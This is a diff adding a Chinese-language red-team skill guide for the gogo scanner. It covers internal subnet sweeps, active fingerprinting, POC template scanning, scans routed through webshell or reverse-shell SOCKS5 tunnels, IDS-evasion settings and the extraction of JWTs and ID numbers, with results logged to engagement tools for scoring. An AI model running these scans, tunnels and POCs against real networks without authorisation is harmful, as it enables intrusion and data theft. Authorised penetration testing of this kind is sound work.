+**指纹与提取**
+```
+-v/--verbose         主动指纹识别（不发这个只有被动指纹，信息少但安静）
+--ff <file>          自定义指纹库
+--extract "<regex>"  自定义提取正则
+gogo -P extract      查看内置提取规则（jwt / mail / idcard / phone / ip 等）
+```
+
+**漏洞（neutron 内核）**
+```
+-e/--exploit         开启 POC 扫描（与 -v 合用写作 -ev）
+-E <name>            指定模板名        --ef <file>  指定模板文件
+--payload <s>        指定 payload      --attack-type sniper|clusterbomb|pitchfork
+```
+
+**代理**
+```
+--proxy socks5://127.0.0.1:11111      # 实测可用，走 suo5 / ssh -D 隧道
+```
+
+## 标准作业流程（SOP）
+
+```bash
+# 0) 探路
+ip a; ip route; arp -a; cat /etc/hosts /etc/resolv.conf
+
+# 1) 大网段测绘（安静、先探活、结果落文件）
+./gogo -i 10.0.0.0/16 -m ss --ping -p top2,win,db --af -t 500 -d 3
+
+# 2) 看结果（human-like）
+./gogo -F ./.10.0.0.0_16_top2_win_db_ss_dat
+
+# 3) 对存活主机上全端口 + 主动指纹
+./gogo -i 10.0.1.0/24 -p - -v -t 1000 -d 3 --af
+
+# 4) 定向打 POC（只对确认有指纹的目标）
+./gogo -i 10.0.1.5,10.0.1.9 -p top2 -ev -E <模板名>
+
+# 5) 复用上一步结果继续深挖（不用重扫）
+./gogo -j ./step1.dat -p 1-65535 -v -e
+```
+
+### 走隧道测绘（内网渗透主路径）
+
+```bash
+# 前提：技能 suo5-tunnel 建好 socks5，或 vps-reverse-shell 里 ssh -D
+./gogo -i 10.0.0.0/16 -m ss --ping -p top2,win,db --af \
+       --proxy socks5://127.0.0.1:1080 -t 300 -d 5 -q
+
+# 实测：gogo --proxy socks5:// 会把流量真正送进隧道（经 VPS 扫到的是 VPS 的 SSH 指纹）
+```
+
+隧道场景把 `-t` 降到 300 以内、`-d` 提到 5，否则隧道会丢包误判。
+
+## 结果落库（必须做）
+
+gogo 的 `.dat` 是压缩 JSON Lines，先格式化再解析入库：
+
+```bash
+./gogo -F ./result.dat -o json -f result.json      # 转成 JSON（实测产物结构见下）
+python3 tools/parse.py result.json
+# 解析要点：顶层是 {config, ip, data:[...]}，每条含 ip/port/protocol/status/frameworks/title/timing
+```
+```python
+import json
+d = json.load(open('result.json', encoding='utf-8'))
+for it in d.get('data', []):
+    fw = ','.join((it.get('frameworks') or {}).keys())
+    print(it.get('ip'), it.get('port'), it.get('protocol'), fw, it.get('title'))
+# 实测单条：{"ip":"10.0.0.5","port":"22","protocol":"tcp","status":"open",
+#             "frameworks":{"ssh":{"name":"ssh","attributes":{"version":"10.3p1"}}},
+#             "title":"SSH-2.0-OpenS","timing":26}
+```
+
+```bash
+# 入库纪律（与 fscan 相同）
+redteam_asset_add      { engagement, ip, port, service, title, source: "gogo", tags: [...] }
+redteam_web_list       # 之后由 web 指纹技能补充 URL/标题
+redteam_vuln_add       { engagement, target, name, severity, evidence_ref }   # 必须配证据
+```
+
+**注意**：gogo 的框架/指纹结果写进 `asset` 的 `fingerprint` 字段，不要只留在终端里。
+扫到的敏感信息提取结果（邮箱/身份证/JWT）属于「大量敏感信息」得分点，用 `redteam_vuln_add` +
+`redteam_score_hit` 记录，证据落 `runs/`。
+
+## 排障
+
+| 现象 | 处理 |
+| --- | --- |
+| 参数报错 | 长参数用双横线（`--af` 不是 `-af`），`-P` 只接受 `port/workflow/neutron/extract` |
+| 结果文件找不到 | `--af` 写在**二进制同目录**，加 `--path` 指定目录 |
+| 大网段几乎没结果 | `--ping` 会漏掉禁 ping 主机；去掉 `--ping` 或改 `--ipp` 调整探针 |
+| 扫描太慢 | 提高 `-t`、降低 `-d`；`-p` 换成 `top1`/`top2`；大网段用 `-m ss` |
+| 被 IDS 发现 | `--opsec` + `-t 200` + `-d 3`；不要开 `-e`；不要 `-p -` |
+| 隧道里大量超时 | 降 `-t`、升 `-d`，隧道带宽是瓶颈 |
+| 想只看结果不看日志 | `-q`（联动其他工具必加） |
+
+## 相关技能
+
+- `fscan-intranet`：铺面之后的爆破与利用
+- `suo5-tunnel`：WebShell → SOCKS5，给 gogo 提供 `--proxy` 入口
+- `vps-reverse-shell`：隧道与载荷投递
+- `web-fingerprint` / `asset-correlation`：把 gogo 的结果进一步关联成资产图谱
